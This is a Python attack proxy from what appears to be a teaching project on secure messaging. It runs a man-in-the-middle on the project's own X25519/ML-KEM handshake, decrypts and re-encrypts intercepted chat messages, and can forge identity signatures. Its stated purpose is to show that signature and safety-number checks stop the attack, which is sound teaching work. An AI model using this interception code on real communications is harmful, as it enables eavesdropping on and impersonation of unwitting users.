"""
mitm_proxy.py - ATTACK 1: man-in-the-middle on the key exchange
-----------------------------------------------------------------
The attacker sits between the clients and the server and runs ITS OWN key
exchange with each side, so it ends up with TWO sessions:

    alice  <== keys K1 ==>  ATTACKER  <== keys K2 ==>  bob

It can then decrypt every message, read it, re-encrypt it and pass it on.
Neither side notices... unless the key exchange is AUTHENTICATED.

The attacker copies the full handshake (X25519 AND ML-KEM-768 AND the Double
Ratchet), so post-quantum crypto alone does not stop it either. Only the
signatures + identity checks do.

Modes:
    (default)          replace the key-exchange fields, keep alice's real signature
                       -> secure clients: signature check fails -> SIG_FAIL, refused
                       -> --insecure clients: attack WORKS, proxy prints every message
    --forge-identity   also replace the identity key with the attacker's own and re-sign
                       -> first-ever contact: handshake succeeds, BUT the safety numbers
                          on alice's and bob's screens are DIFFERENT (that's how you catch it)
                       -> if alice and bob had talked before: IDENTITY_CHANGED, refused

Run (server + clients with --no-tls, clients pointing at port 9100):
    python -m attacks.mitm_proxy --listen 9100 --server-port 9000
    python -m attacks.mitm_proxy --forge-identity
"""

from attacks.proxy_base import GREEN, RED, YELLOW, AttackProxy, common_args, run, say
from client.session import Session
from common import crypto_utils
from common.envelope import b64decode, b64encode
from common.handshake import INIT_FIELDS, RESP_FIELDS, init_transcript, resp_transcript


def read_fields(envelope, names):
    return {name: b64decode(envelope[name]) for name in names if name in envelope}


def write_fields(envelope, names, fields):
    for name in names:
        envelope.pop(name, None)
    envelope.update({name: b64encode(value) for name, value in fields.items()})


class MitmProxy(AttackProxy):
    name = "MITM"

    def __init__(self, *args, forge_identity=False):
        super().__init__(*args)
        self.forge_identity = forge_identity
        # The attacker's own identity key (used only with --forge-identity).
        self.attacker_identity, self.attacker_identity_pub = crypto_utils.generate_identity_keypair()
        # (initiator, responder) -> the two sessions the attacker holds
        self.pairs = {}

    def forge(self, envelope, transcript):
        envelope["id_pub"] = b64encode(self.attacker_identity_pub)
        envelope["sig"] = b64encode(crypto_utils.sign(self.attacker_identity, transcript))

    async def on_client_frame(self, conn, envelope):
        kind = envelope.get("type")
        sender, target = conn.username, envelope.get("to")
        insecure = bool(envelope.get("insecure"))

        # ---------------- KEY_INIT: alice -> bob ----------------
        if kind == "KEY_INIT":
            alice_fields = read_fields(envelope, INIT_FIELDS)
            use_pq = "kem_pub" in alice_fields

            # Towards alice the attacker plays BOB (responder) ...
            with_alice = Session(sender, is_initiator=False, insecure=insecure, pq=use_pq)
            reply_for_alice = with_alice.respond(alice_fields)
            # ... and towards bob it plays ALICE (initiator).
            with_bob = Session(target, is_initiator=True, insecure=insecure, pq=use_pq)
            fields_for_bob = with_bob.init_fields()

            self.pairs[(sender, target)] = {"with_alice": with_alice, "with_bob": with_bob,
                                            "alice_fields": alice_fields,
                                            "reply_for_alice": reply_for_alice}
            write_fields(envelope, INIT_FIELDS, fields_for_bob)
            what = "X25519 + ML-KEM keys" if use_pq else "X25519 key"
            if self.forge_identity:
                self.forge(envelope, init_transcript(sender, target, fields_for_bob))
                say(RED, f"[MITM] KEY_INIT {sender}->{target}: replaced {what} AND identity, re-signed")
            else:
                say(RED, f"[MITM] KEY_INIT {sender}->{target}: replaced {what} "
                         f"(kept {sender}'s original signature)")
            return [envelope]

        # ---------------- KEY_RESP: bob -> alice ----------------
        if kind == "KEY_RESP" and (target, sender) in self.pairs:
            pair = self.pairs[(target, sender)]
            pair["with_bob"].finish(read_fields(envelope, RESP_FIELDS))
            write_fields(envelope, RESP_FIELDS, pair["reply_for_alice"])
            if self.forge_identity:
                self.forge(envelope, resp_transcript(target, sender, pair["alice_fields"],
                                                     pair["reply_for_alice"]))
            say(RED, f"[MITM] KEY_RESP {sender}->{target}: replaced. "
                     f"Attacker now holds both sessions ({pair['with_bob'].suite}).")
            return [envelope]

        # ---------------- CHAT: decrypt, read, re-encrypt ----------------
        if kind == "CHAT":
            if (sender, target) in self.pairs:          # from the initiator
                pair = self.pairs[(sender, target)]
                inbound, outbound = pair["with_alice"], pair["with_bob"]
            elif (target, sender) in self.pairs:        # from the responder
                pair = self.pairs[(target, sender)]
                inbound, outbound = pair["with_bob"], pair["with_alice"]
            else:
                return [envelope]

            text = inbound.decrypt_message(b64decode(envelope["packet"]))
            say(GREEN, f"[MITM] INTERCEPTED {sender} -> {target}: {text!r}")
            envelope["packet"] = b64encode(outbound.encrypt_message(text))
            return [envelope]

        return [envelope]


def main():
    parser = common_args("MITM attack proxy (demo only)")
    parser.add_argument("--forge-identity", action="store_true",
                        help="also replace identity keys with the attacker's own")
    args = parser.parse_args()
    say(YELLOW, "[MITM] Start server and clients with --no-tls; point clients at the proxy port.")
    run(MitmProxy(args.listen, args.server_host, args.server_port,
                  forge_identity=args.forge_identity))


if __name__ == "__main__":
    main()
